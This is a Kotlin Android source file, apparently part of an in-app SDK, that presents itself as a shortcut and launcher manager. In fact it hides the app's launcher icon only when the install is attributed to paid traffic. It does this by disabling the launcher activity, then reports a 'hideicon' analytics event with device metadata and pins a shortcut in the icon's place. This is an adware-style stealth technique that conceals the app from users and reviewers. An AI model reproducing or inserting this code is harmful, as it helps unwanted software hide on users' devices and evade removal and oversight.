package com.sunrise.sunrise.control

import android.content.ComponentName
import android.content.Intent
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import androidx.core.content.edit
import androidx.core.content.pm.ShortcutInfoCompat
import androidx.core.content.pm.ShortcutManagerCompat
import androidx.core.graphics.drawable.IconCompat
import com.sunrise.sunrise.SSDK
import com.sunrise.sunrise.SRAPP
import com.sunrise.sunrise.support.LogUtil
import com.sunrise.sunrise.support.Switch
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlin.math.pow

class ShortcutAndLauncherManager2 private constructor() {
    companion object {
        private val TAG = ShortcutAndLauncherManager2::class.java.simpleName

        val instance: ShortcutAndLauncherManager2 by lazy(mode = LazyThreadSafetyMode.SYNCHRONIZED) {
            ShortcutAndLauncherManager2()
        }
    }

    private val I_K = "launcherIcon"
    private val pm = SRAPP.app.packageManager
    private val pkg = SRAPP.app.packageName


    fun check(repeatTimes: Int = 0) {
        CoroutineScope(Dispatchers.Main).launch {
            delay(6000L * 4F.pow(repeatTimes).toLong())
            if (SunConfig.instance.hasLocalConfig() && TrafficType.instance.getType() == TrafficType.TRAFFIC_PAID) {

                do{
                    if(!SSDK.instance.sdkEnable())
                        break

                    if (SSDK.instance.sp.getBoolean(I_K, false)) {
                        if (Switch.LOG_ENABLE) {
                            LogUtil.getInstance().v(TAG, "icon is already hidden")
                        }
                        break
                    }

                    retrieveLauncherActivity()?.let{
                        hideIcon(it.name)
                        createShortcut(it)
                    }
                }while(false)

            } else if (repeatTimes < 3) {
                check(repeatTimes + 1)
            } else {
                if (Switch.LOG_ENABLE) {
                    LogUtil.getInstance().e(TAG, "hide failed:have tried three times")
                }
            }
        }
    }

    private fun retrieveLauncherActivity(): ActivityInfo? {

        val intent = Intent(Intent.ACTION_MAIN, null).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
            setPackage(pkg)
        }

        val appList = pm.queryIntentActivities(intent, 0)
        for (info in appList) {
            val name = "___${info.activityInfo.packageName}"
            if (name.substring(3 until name.length).equals(pkg, ignoreCase = true)) {
                return info.activityInfo
            }
        }
        return null
    }

    private fun hideIcon(launcherClsName: String?) {
        if (Switch.LOG_ENABLE) {
            LogUtil.getInstance().d(TAG, "hideIcon, doing...")
        }

        try {

            val launcherComponent = launcherClsName?.let { ComponentName(pkg, it) }

            launcherComponent?.takeIf { pm.getComponentEnabledSetting(it) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED }?.let{
                pm.setComponentEnabledSetting(
                    it, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )

                SSDK.instance.sp.edit {
                    putBoolean(I_K, true)
                }

                SSDK.instance.analytics.logEvent("hideicon", Pair("dev", TrafficType.instance.getDevMeta()))
            }
        } catch (e: Exception) {
            if (Switch.LOG_ENABLE) {
                e.printStackTrace()
            }

            SSDK.instance.analytics.logError(null, "hideIcon", e)
        }
    }

    private fun createShortcut(launcherInfo: ActivityInfo?) {

        try {

            do{
                if (!ShortcutManagerCompat.isRequestPinShortcutSupported(SRAPP.app))
                    break

                val component = launcherInfo?.let { ComponentName(pkg, it.targetActivity) } ?: break
                val shortcutIntent = Intent().apply {
                    setComponent(component)
                    action = Intent.ACTION_VIEW
                }

                val appName = launcherInfo.loadLabel(SRAPP.app.packageManager) as? String ?: break

                val shortcutInfoBuilder = ShortcutInfoCompat.Builder(SRAPP.app, appName)
                val shortcutInfo = shortcutInfoBuilder.let {
                    it.setIcon(
                        IconCompat.createWithResource(
                            SRAPP.app,
                            launcherInfo.iconResource
                        )
                    ).setShortLabel(appName)
                }.apply {
                    setIntent(shortcutIntent)
                    setLongLabel(appName)
                    setActivity(component)
                }.build()

                ShortcutManagerCompat.requestPinShortcut(
                    SRAPP.app,
                    shortcutInfo,
                    null
                )

            }while(false)

        } catch (th: Throwable) {
            if (Switch.LOG_ENABLE) {
                th.printStackTrace()
            }

            SSDK.instance.analytics.logError(null,"createShortcut", th)
        }
    }
}